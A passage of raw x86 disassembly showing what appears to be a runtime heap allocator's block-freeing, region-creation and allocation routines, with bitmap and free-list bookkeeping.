  426806:	mov    DWORD PTR [edx+0x4],ebx
  426809:	mov    edx,DWORD PTR [ebp+0xc]
  42680c:	mov    ebx,DWORD PTR [edx+0x4]
  42680f:	mov    edx,DWORD PTR [edx+0x8]
  426812:	mov    DWORD PTR [ebx+0x8],edx
  426815:	mov    DWORD PTR [ebp-0x4],ecx
  426818:	mov    edx,ecx
  42681a:	sar    edx,0x4
  42681d:	dec    edx
  42681e:	cmp    edx,0x3f
  426821:	jbe    0x426826
  426823:	push   0x3f
  426825:	pop    edx
  426826:	mov    ebx,DWORD PTR [ebp-0x8]
  426829:	and    ebx,0x1
  42682c:	mov    DWORD PTR [ebp-0xc],ebx
  42682f:	jne    0x4268c4
  426835:	sub    esi,DWORD PTR [ebp-0x8]
  426838:	mov    ebx,DWORD PTR [ebp-0x8]
  42683b:	sar    ebx,0x4
  42683e:	push   0x3f
  426840:	mov    DWORD PTR [ebp+0xc],esi
  426843:	dec    ebx
  426844:	pop    esi
  426845:	cmp    ebx,esi
  426847:	jbe    0x42684b
  426849:	mov    ebx,esi
  42684b:	add    ecx,DWORD PTR [ebp-0x8]
  42684e:	mov    edx,ecx
  426850:	sar    edx,0x4
  426853:	dec    edx
  426854:	cmp    edx,esi
  426856:	mov    DWORD PTR [ebp-0x4],ecx
  426859:	jbe    0x42685d
  42685b:	mov    edx,esi
  42685d:	cmp    ebx,edx
  42685f:	je     0x4268bf
  426861:	mov    ecx,DWORD PTR [ebp+0xc]
  426864:	mov    esi,DWORD PTR [ecx+0x4]
  426867:	cmp    esi,DWORD PTR [ecx+0x8]
  42686a:	jne    0x4268a7
  42686c:	cmp    ebx,0x20
  42686f:	mov    esi,0x80000000
  426874:	jae    0x42688d
  426876:	mov    ecx,ebx
  426878:	shr    esi,cl
  42687a:	not    esi
  42687c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426880:	dec    BYTE PTR [ebx+eax*1+0x4]
  426884:	jne    0x4268a7
  426886:	mov    ecx,DWORD PTR [ebp+0x8]
  426889:	and    DWORD PTR [ecx],esi
  42688b:	jmp    0x4268a7
  42688d:	lea    ecx,[ebx-0x20]
  426890:	shr    esi,cl
  426892:	not    esi
  426894:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42689b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42689f:	jne    0x4268a7
  4268a1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268a4:	and    DWORD PTR [ecx+0x4],esi
  4268a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268aa:	mov    esi,DWORD PTR [ecx+0x8]
  4268ad:	mov    ecx,DWORD PTR [ecx+0x4]
  4268b0:	mov    DWORD PTR [esi+0x4],ecx
  4268b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268b6:	mov    esi,DWORD PTR [ecx+0x4]
  4268b9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268bc:	mov    DWORD PTR [esi+0x8],ecx
  4268bf:	mov    esi,DWORD PTR [ebp+0xc]
  4268c2:	jmp    0x4268c7
  4268c4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268c7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268cb:	jne    0x4268d5
  4268cd:	cmp    ebx,edx
  4268cf:	je     0x426955
  4268d5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268d8:	lea    ecx,[ecx+edx*8]
  4268db:	mov    ebx,DWORD PTR [ecx+0x4]
  4268de:	mov    DWORD PTR [esi+0x8],ecx
  4268e1:	mov    DWORD PTR [esi+0x4],ebx
  4268e4:	mov    DWORD PTR [ecx+0x4],esi
  4268e7:	mov    ecx,DWORD PTR [esi+0x4]
  4268ea:	mov    DWORD PTR [ecx+0x8],esi
  4268ed:	mov    ecx,DWORD PTR [esi+0x4]
  4268f0:	cmp    ecx,DWORD PTR [esi+0x8]
  4268f3:	jne    0x426955
  4268f5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4268f9:	mov    BYTE PTR [ebp+0xf],cl
  4268fc:	inc    cl
  4268fe:	cmp    edx,0x20
  426901:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426905:	jae    0x42692c
  426907:	cmp    BYTE PTR [ebp+0xf],0x0
  42690b:	jne    0x42691b
  42690d:	mov    ecx,edx
  42690f:	mov    ebx,0x80000000
  426914:	shr    ebx,cl
  426916:	mov    ecx,DWORD PTR [ebp+0x8]
  426919:	or     DWORD PTR [ecx],ebx
  42691b:	mov    ebx,0x80000000
  426920:	mov    ecx,edx
  426922:	shr    ebx,cl
  426924:	lea    eax,[eax+edi*4+0x44]
  426928:	or     DWORD PTR [eax],ebx
  42692a:	jmp    0x426955
  42692c:	cmp    BYTE PTR [ebp+0xf],0x0
  426930:	jne    0x426942
  426932:	lea    ecx,[edx-0x20]
  426935:	mov    ebx,0x80000000
  42693a:	shr    ebx,cl
  42693c:	mov    ecx,DWORD PTR [ebp+0x8]
  42693f:	or     DWORD PTR [ecx+0x4],ebx
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    edx,0x80000000
  42694a:	shr    edx,cl
  42694c:	lea    eax,[eax+edi*4+0xc4]
  426953:	or     DWORD PTR [eax],edx
  426955:	mov    eax,DWORD PTR [ebp-0x4]
  426958:	mov    DWORD PTR [esi],eax
  42695a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42695e:	mov    eax,DWORD PTR [ebp-0x10]
  426961:	dec    DWORD PTR [eax]
  426963:	jne    0x426a60
  426969:	mov    eax,ds:0x45def8
  42696e:	test   eax,eax
  426970:	je     0x426a52
  426976:	mov    ecx,DWORD PTR ds:0x45df10
  42697c:	mov    esi,DWORD PTR ds:0x4290ac
  426982:	push   0x4000
  426987:	shl    ecx,0xf
  42698a:	add    ecx,DWORD PTR [eax+0xc]
  42698d:	mov    ebx,0x8000
  426992:	push   ebx
  426993:	push   ecx
  426994:	call   esi
  426996:	mov    ecx,DWORD PTR ds:0x45df10
  42699c:	mov    eax,ds:0x45def8
  4269a1:	mov    edx,0x80000000
  4269a6:	shr    edx,cl
  4269a8:	or     DWORD PTR [eax+0x8],edx
  4269ab:	mov    eax,ds:0x45def8
  4269b0:	mov    eax,DWORD PTR [eax+0x10]
  4269b3:	mov    ecx,DWORD PTR ds:0x45df10
  4269b9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269c1:	mov    eax,ds:0x45def8
  4269c6:	mov    eax,DWORD PTR [eax+0x10]
  4269c9:	dec    BYTE PTR [eax+0x43]
  4269cc:	mov    eax,ds:0x45def8
  4269d1:	mov    ecx,DWORD PTR [eax+0x10]
  4269d4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269d8:	jne    0x4269e3
  4269da:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269de:	mov    eax,ds:0x45def8
  4269e3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269e7:	jne    0x426a52
  4269e9:	push   ebx
  4269ea:	push   0x0
  4269ec:	push   DWORD PTR [eax+0xc]
  4269ef:	call   esi
  4269f1:	mov    eax,ds:0x45def8
  4269f6:	push   DWORD PTR [eax+0x10]
  4269f9:	push   0x0
  4269fb:	push   DWORD PTR ds:0x45e140
  426a01:	call   DWORD PTR ds:0x42902c
  426a07:	mov    eax,ds:0x45defc
  426a0c:	mov    edx,DWORD PTR ds:0x45df00
  426a12:	lea    eax,[eax+eax*4]
  426a15:	shl    eax,0x2
  426a18:	mov    ecx,eax
  426a1a:	mov    eax,ds:0x45def8
  426a1f:	sub    ecx,eax
  426a21:	lea    ecx,[ecx+edx*1-0x14]
  426a25:	push   ecx
  426a26:	lea    ecx,[eax+0x14]
  426a29:	push   ecx
  426a2a:	push   eax
  426a2b:	call   0x428280
  426a30:	mov    eax,DWORD PTR [ebp+0x8]
  426a33:	add    esp,0xc
  426a36:	dec    DWORD PTR ds:0x45defc
  426a3c:	cmp    eax,DWORD PTR ds:0x45def8
  426a42:	jbe    0x426a48
  426a44:	sub    DWORD PTR [ebp+0x8],0x14
  426a48:	mov    eax,ds:0x45df00
  426a4d:	mov    ds:0x45df08,eax
  426a52:	mov    eax,DWORD PTR [ebp+0x8]
  426a55:	mov    ds:0x45def8,eax
  426a5a:	mov    DWORD PTR ds:0x45df10,edi
  426a60:	pop    ebx
  426a61:	pop    edi
  426a62:	pop    esi
  426a63:	leave  
  426a64:	ret    
  426a65:	mov    eax,ds:0x45defc
  426a6a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a70:	push   edi
  426a71:	xor    edi,edi
  426a73:	cmp    eax,ecx
  426a75:	jne    0x426aab
  426a77:	lea    eax,[ecx+ecx*4+0x50]
  426a7b:	shl    eax,0x2
  426a7e:	push   eax
  426a7f:	push   DWORD PTR ds:0x45df00
  426a85:	push   edi
  426a86:	push   DWORD PTR ds:0x45e140
  426a8c:	call   DWORD PTR ds:0x4290d0
  426a92:	cmp    eax,edi
  426a94:	jne    0x426a9a
  426a96:	xor    eax,eax
  426a98:	pop    edi
  426a99:	ret    
  426a9a:	add    DWORD PTR ds:0x45df0c,0x10
  426aa1:	mov    ds:0x45df00,eax
  426aa6:	mov    eax,ds:0x45defc
  426aab:	mov    ecx,DWORD PTR ds:0x45df00
  426ab1:	push   esi
  426ab2:	push   0x41c4
  426ab7:	push   0x8
  426ab9:	push   DWORD PTR ds:0x45e140
  426abf:	lea    eax,[eax+eax*4]
  426ac2:	lea    esi,[ecx+eax*4]
  426ac5:	call   DWORD PTR ds:0x429030
  426acb:	cmp    eax,edi
  426acd:	mov    DWORD PTR [esi+0x10],eax
  426ad0:	jne    0x426ad6
  426ad2:	xor    eax,eax
  426ad4:	jmp    0x426b19
  426ad6:	push   0x4
  426ad8:	push   0x2000
  426add:	push   0x100000
  426ae2:	push   edi
  426ae3:	call   DWORD PTR ds:0x4290cc
  426ae9:	cmp    eax,edi
  426aeb:	mov    DWORD PTR [esi+0xc],eax
  426aee:	jne    0x426b02
  426af0:	push   DWORD PTR [esi+0x10]
  426af3:	push   edi
  426af4:	push   DWORD PTR ds:0x45e140
  426afa:	call   DWORD PTR ds:0x42902c
  426b00:	jmp    0x426ad2
  426b02:	or     DWORD PTR [esi+0x8],0xffffffff
  426b06:	mov    DWORD PTR [esi],edi
  426b08:	mov    DWORD PTR [esi+0x4],edi
  426b0b:	inc    DWORD PTR ds:0x45defc
  426b11:	mov    eax,DWORD PTR [esi+0x10]
  426b14:	or     DWORD PTR [eax],0xffffffff
  426b17:	mov    eax,esi
  426b19:	pop    esi
  426b1a:	pop    edi
  426b1b:	ret    
  426b1c:	push   ebp
  426b1d:	mov    ebp,esp
  426b1f:	push   ecx
  426b20:	push   ecx
  426b21:	mov    ecx,DWORD PTR [ebp+0x8]
  426b24:	mov    eax,DWORD PTR [ecx+0x8]
  426b27:	push   ebx
  426b28:	push   esi
  426b29:	mov    esi,DWORD PTR [ecx+0x10]
  426b2c:	push   edi
  426b2d:	xor    ebx,ebx
  426b2f:	jmp    0x426b34
  426b31:	shl    eax,1
  426b33:	inc    ebx
  426b34:	test   eax,eax
  426b36:	jge    0x426b31
  426b38:	mov    eax,ebx
  426b3a:	imul   eax,eax,0x204
  426b40:	lea    eax,[eax+esi*1+0x144]
  426b47:	push   0x3f
  426b49:	mov    DWORD PTR [ebp-0x8],eax
  426b4c:	pop    edx
  426b4d:	mov    DWORD PTR [eax+0x8],eax
  426b50:	mov    DWORD PTR [eax+0x4],eax
  426b53:	add    eax,0x8
  426b56:	dec    edx
  426b57:	jne    0x426b4d
  426b59:	push   0x4
  426b5b:	mov    edi,ebx
  426b5d:	push   0x1000
  426b62:	shl    edi,0xf
  426b65:	add    edi,DWORD PTR [ecx+0xc]
  426b68:	push   0x8000
  426b6d:	push   edi
  426b6e:	call   DWORD PTR ds:0x4290cc
  426b74:	test   eax,eax
  426b76:	jne    0x426b80
  426b78:	or     eax,0xffffffff
  426b7b:	jmp    0x426c1d
  426b80:	lea    edx,[edi+0x7000]
  426b86:	cmp    edi,edx
  426b88:	mov    DWORD PTR [ebp-0x4],edx
  426b8b:	ja     0x426bd0
  426b8d:	mov    ecx,edx
  426b8f:	sub    ecx,edi
  426b91:	shr    ecx,0xc
  426b94:	lea    eax,[edi+0x10]
  426b97:	inc    ecx
  426b98:	or     DWORD PTR [eax-0x8],0xffffffff
  426b9c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426ba3:	lea    edx,[eax+0xffc]
  426ba9:	mov    DWORD PTR [eax],edx
  426bab:	lea    edx,[eax-0x1004]
  426bb1:	mov    DWORD PTR [eax-0x4],0xff0
  426bb8:	mov    DWORD PTR [eax+0x4],edx
  426bbb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bc5:	add    eax,0x1000
  426bca:	dec    ecx
  426bcb:	jne    0x426b98
  426bcd:	mov    edx,DWORD PTR [ebp-0x4]
  426bd0:	mov    eax,DWORD PTR [ebp-0x8]
  426bd3:	add    eax,0x1f8
  426bd8:	lea    ecx,[edi+0xc]
  426bdb:	mov    DWORD PTR [eax+0x4],ecx
  426bde:	mov    DWORD PTR [ecx+0x8],eax
  426be1:	lea    ecx,[edx+0xc]
  426be4:	mov    DWORD PTR [eax+0x8],ecx
  426be7:	mov    DWORD PTR [ecx+0x4],eax
  426bea:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bef:	xor    edi,edi
  426bf1:	inc    edi
  426bf2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426bf9:	mov    al,BYTE PTR [esi+0x43]
  426bfc:	mov    cl,al
  426bfe:	inc    cl
  426c00:	test   al,al
  426c02:	mov    eax,DWORD PTR [ebp+0x8]
  426c05:	mov    BYTE PTR [esi+0x43],cl
  426c08:	jne    0x426c0d
  426c0a:	or     DWORD PTR [eax+0x4],edi
  426c0d:	mov    edx,0x80000000
  426c12:	mov    ecx,ebx
  426c14:	shr    edx,cl
  426c16:	not    edx
  426c18:	and    DWORD PTR [eax+0x8],edx
  426c1b:	mov    eax,ebx
  426c1d:	pop    edi
  426c1e:	pop    esi
  426c1f:	pop    ebx
  426c20:	leave  
  426c21:	ret    
  426c22:	push   ebp
  426c23:	mov    ebp,esp
  426c25:	sub    esp,0xc
  426c28:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2b:	mov    eax,DWORD PTR [ecx+0x10]
  426c2e:	push   ebx
  426c2f:	push   esi
  426c30:	mov    esi,DWORD PTR [ebp+0x10]
  426c33:	push   edi
  426c34:	mov    edi,DWORD PTR [ebp+0xc]
  426c37:	mov    edx,edi
  426c39:	sub    edx,DWORD PTR [ecx+0xc]
  426c3c:	add    esi,0x17
  426c3f:	shr    edx,0xf
  426c42:	mov    ecx,edx
  426c44:	imul   ecx,ecx,0x204
  426c4a:	lea    ecx,[ecx+eax*1+0x144]
  426c51:	mov    DWORD PTR [ebp-0xc],ecx
  426c54:	mov    ecx,DWORD PTR [edi-0x4]
  426c57:	and    esi,0xfffffff0
  426c5a:	dec    ecx
  426c5b:	cmp    esi,ecx
  426c5d:	lea    edi,[ecx+edi*1-0x4]
  426c61:	mov    ebx,DWORD PTR [edi]
  426c63:	mov    DWORD PTR [ebp+0x10],ecx
  426c66:	mov    DWORD PTR [ebp-0x4],ebx
  426c69:	jle    0x426dc4
  426c6f:	test   bl,0x1
  426c72:	jne    0x426dbd
  426c78:	add    ebx,ecx
  426c7a:	cmp    esi,ebx
  426c7c:	jg     0x426dbd
  426c82:	mov    ecx,DWORD PTR [ebp-0x4]
  426c85:	sar    ecx,0x4
  426c88:	dec    ecx
  426c89:	cmp    ecx,0x3f
  426c8c:	mov    DWORD PTR [ebp-0x8],ecx
  426c8f:	jbe    0x426c97
  426c91:	push   0x3f
  426c93:	pop    ecx
  426c94:	mov    DWORD PTR [ebp-0x8],ecx
  426c97:	mov    ebx,DWORD PTR [edi+0x4]
  426c9a:	cmp    ebx,DWORD PTR [edi+0x8]
  426c9d:	jne    0x426ce2
  426c9f:	cmp    ecx,0x20
  426ca2:	mov    ebx,0x80000000
  426ca7:	jae    0x426cc3
  426ca9:	shr    ebx,cl
  426cab:	mov    ecx,DWORD PTR [ebp-0x8]
  426cae:	lea    ecx,[ecx+eax*1+0x4]
  426cb2:	not    ebx
  426cb4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cb8:	dec    BYTE PTR [ecx]
  426cba:	jne    0x426ce2
  426cbc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cbf:	and    DWORD PTR [ecx],ebx
  426cc1:	jmp    0x426ce2
  426cc3:	add    ecx,0xffffffe0
  426cc6:	shr    ebx,cl
  426cc8:	mov    ecx,DWORD PTR [ebp-0x8]
  426ccb:	lea    ecx,[ecx+eax*1+0x4]
  426ccf:	not    ebx
  426cd1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426cd8:	dec    BYTE PTR [ecx]
  426cda:	jne    0x426ce2
  426cdc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cdf:	and    DWORD PTR [ecx+0x4],ebx
  426ce2:	mov    ecx,DWORD PTR [edi+0x8]
  426ce5:	mov    ebx,DWORD PTR [edi+0x4]
  426ce8:	mov    DWORD PTR [ecx+0x4],ebx
  426ceb:	mov    ecx,DWORD PTR [edi+0x4]
  426cee:	mov    edi,DWORD PTR [edi+0x8]
  426cf1:	mov    DWORD PTR [ecx+0x8],edi
  426cf4:	mov    ecx,DWORD PTR [ebp+0x10]
  426cf7:	sub    ecx,esi
  426cf9:	add    DWORD PTR [ebp-0x4],ecx
  426cfc:	cmp    DWORD PTR [ebp-0x4],0x0
  426d00:	jle    0x426dab
  426d06:	mov    edi,DWORD PTR [ebp-0x4]
  426d09:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0c:	sar    edi,0x4
  426d0f:	dec    edi
  426d10:	cmp    edi,0x3f
  426d13:	lea    ecx,[ecx+esi*1-0x4]
  426d17:	jbe    0x426d1c
  426d19:	push   0x3f
  426d1b:	pop    edi
  426d1c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d1f:	lea    ebx,[ebx+edi*8]
  426d22:	mov    DWORD PTR [ebp+0x10],ebx
  426d25:	mov    ebx,DWORD PTR [ebx+0x4]
  426d28:	mov    DWORD PTR [ecx+0x4],ebx
  426d2b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d2e:	mov    DWORD PTR [ecx+0x8],ebx
  426d31:	mov    DWORD PTR [ebx+0x4],ecx
  426d34:	mov    ebx,DWORD PTR [ecx+0x4]
  426d37:	mov    DWORD PTR [ebx+0x8],ecx
  426d3a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d3d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d40:	jne    0x426d99
  426d42:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d46:	mov    BYTE PTR [ebp+0x13],cl
  426d49:	inc    cl
  426d4b:	cmp    edi,0x20
  426d4e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d52:	jae    0x426d70
  426d54:	cmp    BYTE PTR [ebp+0x13],0x0
  426d58:	jne    0x426d68
  426d5a:	mov    ecx,edi
  426d5c:	mov    ebx,0x80000000
  426d61:	shr    ebx,cl
  426d63:	mov    ecx,DWORD PTR [ebp+0x8]
  426d66:	or     DWORD PTR [ecx],ebx
  426d68:	lea    eax,[eax+edx*4+0x44]
  426d6c:	mov    ecx,edi
  426d6e:	jmp    0x426d90
  426d70:	cmp    BYTE PTR [ebp+0x13],0x0
  426d74:	jne    0x426d86
  426d76:	lea    ecx,[edi-0x20]
  426d79:	mov    ebx,0x80000000
  426d7e:	shr    ebx,cl
  426d80:	mov    ecx,DWORD PTR [ebp+0x8]
  426d83:	or     DWORD PTR [ecx+0x4],ebx
  426d86:	lea    eax,[eax+edx*4+0xc4]
  426d8d:	lea    ecx,[edi-0x20]
  426d90:	mov    edx,0x80000000
  426d95:	shr    edx,cl
  426d97:	or     DWORD PTR [eax],edx
  426d99:	mov    edx,DWORD PTR [ebp+0xc]
  426d9c:	mov    ecx,DWORD PTR [ebp-0x4]
  426d9f:	lea    eax,[edx+esi*1-0x4]
  426da3:	mov    DWORD PTR [eax],ecx
  426da5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426da9:	jmp    0x426dae
  426dab:	mov    edx,DWORD PTR [ebp+0xc]
  426dae:	lea    eax,[esi+0x1]
  426db1:	mov    DWORD PTR [edx-0x4],eax
  426db4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426db8:	jmp    0x426ef9
  426dbd:	xor    eax,eax
  426dbf:	jmp    0x426efc
  426dc4:	jge    0x426ef9
  426dca:	mov    ebx,DWORD PTR [ebp+0xc]
  426dcd:	sub    DWORD PTR [ebp+0x10],esi
  426dd0:	lea    ecx,[esi+0x1]
  426dd3:	mov    DWORD PTR [ebx-0x4],ecx
  426dd6:	lea    ebx,[ebx+esi*1-0x4]
  426dda:	mov    esi,DWORD PTR [ebp+0x10]
  426ddd:	sar    esi,0x4
  426de0:	dec    esi
  426de1:	cmp    esi,0x3f
  426de4:	mov    DWORD PTR [ebp+0xc],ebx
  426de7:	mov    DWORD PTR [ebx-0x4],ecx
  426dea:	jbe    0x426def
  426dec:	push   0x3f
  426dee:	pop    esi
  426def:	test   BYTE PTR [ebp-0x4],0x1
  426df3:	jne    0x426e79
  426df9:	mov    esi,DWORD PTR [ebp-0x4]
  426dfc:	sar    esi,0x4
  426dff:	dec    esi
  426e00:	cmp    esi,0x3f
  426e03:	jbe    0x426e08
  426e05:	push   0x3f
  426e07:	pop    esi
  426e08:	mov    ecx,DWORD PTR [edi+0x4]
  426e0b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e0e:	jne    0x426e52
  426e10:	cmp    esi,0x20
  426e13:	mov    ebx,0x80000000
  426e18:	jae    0x426e33
  426e1a:	mov    ecx,esi
  426e1c:	shr    ebx,cl
  426e1e:	lea    esi,[esi+eax*1+0x4]
  426e22:	not    ebx
  426e24:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e28:	dec    BYTE PTR [esi]
  426e2a:	jne    0x426e4f
  426e2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2f:	and    DWORD PTR [ecx],ebx
  426e31:	jmp    0x426e4f
  426e33:	lea    ecx,[esi-0x20]
  426e36:	shr    ebx,cl
  426e38:	lea    ecx,[esi+eax*1+0x4]
  426e3c:	not    ebx
  426e3e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e45:	dec    BYTE PTR [ecx]
  426e47:	jne    0x426e4f
  426e49:	mov    ecx,DWORD PTR [ebp+0x8]
  426e4c:	and    DWORD PTR [ecx+0x4],ebx
  426e4f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e52:	mov    ecx,DWORD PTR [edi+0x8]
  426e55:	mov    esi,DWORD PTR [edi+0x4]
  426e58:	mov    DWORD PTR [ecx+0x4],esi
  426e5b:	mov    esi,DWORD PTR [edi+0x8]
  426e5e:	mov    ecx,DWORD PTR [edi+0x4]
  426e61:	mov    DWORD PTR [ecx+0x8],esi
  426e64:	mov    esi,DWORD PTR [ebp+0x10]
  426e67:	add    esi,DWORD PTR [ebp-0x4]
  426e6a:	mov    DWORD PTR [ebp+0x10],esi
  426e6d:	sar    esi,0x4
  426e70:	dec    esi
  426e71:	cmp    esi,0x3f
  426e74:	jbe    0x426e79
  426e76:	push   0x3f
  426e78:	pop    esi
  426e79:	mov    ecx,DWORD PTR [ebp-0xc]
  426e7c:	lea    ecx,[ecx+esi*8]
  426e7f:	mov    edi,DWORD PTR [ecx+0x4]
  426e82:	mov    DWORD PTR [ebx+0x8],ecx
  426e85:	mov    DWORD PTR [ebx+0x4],edi
  426e88:	mov    DWORD PTR [ecx+0x4],ebx
  426e8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e8e:	mov    DWORD PTR [ecx+0x8],ebx
  426e91:	mov    ecx,DWORD PTR [ebx+0x4]
  426e94:	cmp    ecx,DWORD PTR [ebx+0x8]
  426e97:	jne    0x426ef0
  426e99:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426e9d:	mov    BYTE PTR [ebp+0xf],cl
  426ea0:	inc    cl
  426ea2:	cmp    esi,0x20
  426ea5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426ea9:	jae    0x426ec7
  426eab:	cmp    BYTE PTR [ebp+0xf],0x0
  426eaf:	jne    0x426ebf
  426eb1:	mov    ecx,esi
  426eb3:	mov    edi,0x80000000
  426eb8:	shr    edi,cl
  426eba:	mov    ecx,DWORD PTR [ebp+0x8]
  426ebd:	or     DWORD PTR [ecx],edi
  426ebf:	lea    eax,[eax+edx*4+0x44]
  426ec3:	mov    ecx,esi
  426ec5:	jmp    0x426ee7
  426ec7:	cmp    BYTE PTR [ebp+0xf],0x0
  426ecb:	jne    0x426edd
  426ecd:	lea    ecx,[esi-0x20]
  426ed0:	mov    edi,0x80000000
  426ed5:	shr    edi,cl
  426ed7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eda:	or     DWORD PTR [ecx+0x4],edi
  426edd:	lea    eax,[eax+edx*4+0xc4]
  426ee4:	lea    ecx,[esi-0x20]
  426ee7:	mov    edx,0x80000000
  426eec:	shr    edx,cl
  426eee:	or     DWORD PTR [eax],edx
  426ef0:	mov    eax,DWORD PTR [ebp+0x10]
  426ef3:	mov    DWORD PTR [ebx],eax
  426ef5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426ef9:	xor    eax,eax
  426efb:	inc    eax
  426efc:	pop    edi
  426efd:	pop    esi
  426efe:	pop    ebx
  426eff:	leave  
  426f00:	ret    
  426f01:	push   ebp
  426f02:	mov    ebp,esp
  426f04:	sub    esp,0x14
  426f07:	mov    ecx,DWORD PTR [ebp+0x8]
  426f0a:	mov    eax,ds:0x45defc
  426f0f:	mov    edx,DWORD PTR ds:0x45df00
  426f15:	add    ecx,0x17
  426f18:	and    ecx,0xfffffff0
  426f1b:	push   ebx
  426f1c:	mov    DWORD PTR [ebp-0x10],ecx
  426f1f:	sar    ecx,0x4
  426f22:	push   esi
  426f23:	lea    eax,[eax+eax*4]
  426f26:	push   edi
  426f27:	dec    ecx
  426f28:	cmp    ecx,0x20
  426f2b:	lea    edi,[edx+eax*4]
  426f2e:	mov    DWORD PTR [ebp-0x4],edi
  426f31:	jge    0x426f3e
  426f33:	or     esi,0xffffffff
  426f36:	shr    esi,cl
  426f38:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f3c:	jmp    0x426f4b
  426f3e:	add    ecx,0xffffffe0
  426f41:	or     eax,0xffffffff
  426f44:	xor    esi,esi
  426f46:	shr    eax,cl
  426f48:	mov    DWORD PTR [ebp-0x8],eax
  426f4b:	mov    eax,ds:0x45df08
  426f50:	mov    ebx,eax
  426f52:	mov    DWORD PTR [ebp-0xc],esi
  426f55:	cmp    ebx,edi
  426f57:	jmp    0x426f6d
  426f59:	mov    ecx,DWORD PTR [ebx+0x4]
  426f5c:	mov    edi,DWORD PTR [ebx]
  426f5e:	and    ecx,DWORD PTR [ebp-0x8]
  426f61:	and    edi,esi
  426f63:	or     ecx,edi
  426f65:	jne    0x426f72
  426f67:	add    ebx,0x14
  426f6a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f6d:	mov    DWORD PTR [ebp+0x8],ebx
  426f70:	jb     0x426f59
  426f72:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f75:	jne    0x426f9b
  426f77:	mov    ebx,edx
  426f79:	jmp    0x426f8c
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    edi,DWORD PTR [ebx]
  426f80:	and    ecx,DWORD PTR [ebp-0x8]
  426f83:	and    edi,esi
  426f85:	or     ecx,edi
  426f87:	jne    0x426f93
  426f89:	add    ebx,0x14
  426f8c:	cmp    ebx,eax
  426f8e:	mov    DWORD PTR [ebp+0x8],ebx
  426f91:	jb     0x426f7b
  426f93:	cmp    ebx,eax
  426f95:	je     0x42702f
  426f9b:	mov    DWORD PTR ds:0x45df08,ebx
  426fa1:	mov    eax,DWORD PTR [ebx+0x10]
  426fa4:	mov    edx,DWORD PTR [eax]
  426fa6:	cmp    edx,0xffffffff
  426fa9:	mov    DWORD PTR [ebp-0x4],edx
  426fac:	je     0x426fc2
  426fae:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fb5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fb9:	and    ecx,DWORD PTR [ebp-0x8]
  426fbc:	and    edi,esi
  426fbe:	or     ecx,edi
  426fc0:	jne    0x426ff8
  426fc2:	mov    edx,DWORD PTR [eax+0xc4]
  426fc8:	and    edx,DWORD PTR [ebp-0x8]
  426fcb:	and    DWORD PTR [ebp-0x4],0x0
  426fcf:	lea    ecx,[eax+0x44]
  426fd2:	mov    esi,DWORD PTR [ecx]
  426fd4:	and    esi,DWORD PTR [ebp-0xc]
  426fd7:	or     edx,esi
  426fd9:	mov    esi,DWORD PTR [ebp-0xc]
  426fdc:	jne    0x426ff5
  426fde:	mov    edx,DWORD PTR [ecx+0x84]
  426fe4:	and    edx,DWORD PTR [ebp-0x8]
  426fe7:	inc    DWORD PTR [ebp-0x4]
  426fea:	add    ecx,0x4
  426fed:	mov    edi,DWORD PTR [ecx]
  426fef:	and    edi,esi
  426ff1:	or     edx,edi
  426ff3:	je     0x426fde
  426ff5:	mov    edx,DWORD PTR [ebp-0x4]
  426ff8:	mov    ecx,edx
  426ffa:	imul   ecx,ecx,0x204
  427000:	lea    ecx,[ecx+eax*1+0x144]
  427007:	mov    DWORD PTR [ebp-0xc],ecx
  42700a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42700e:	xor    edi,edi
  427010:	and    ecx,esi
  427012:	jne    0x427081
  427014:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42701b:	and    ecx,DWORD PTR [ebp-0x8]
